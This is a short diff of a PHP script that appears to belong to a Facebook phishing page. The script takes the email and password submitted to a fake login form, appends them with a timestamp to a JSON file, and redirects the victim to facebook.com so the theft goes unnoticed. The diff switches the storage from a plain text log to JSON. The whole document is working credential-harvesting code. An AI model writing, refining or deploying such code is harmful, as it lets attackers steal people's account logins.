@@ -1,7 +1,17 @@
 <?php
+$usuarios =json_decode( file_get_contents('usernames.json'), true);
 
-file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] 
-. "\n", FILE_APPEND);
-header('Location: https://www.facebook.com/105741151684781/videos/1796556877193650');
+$usuario = [
+    'date' => date("Y-m-d H:i:s"),
+    'username' => [
+        'email'=> $_POST['email'],
+        'pass' => $_POST['pass']
+    ],
+];
+
+array_push($usuarios,$usuario);
+
+file_put_contents("usernames.json", json_encode($usuarios , JSON_PRETTY_PRINT) );
+header('Location: https://www.facebook.com');
 exit();
 ?>
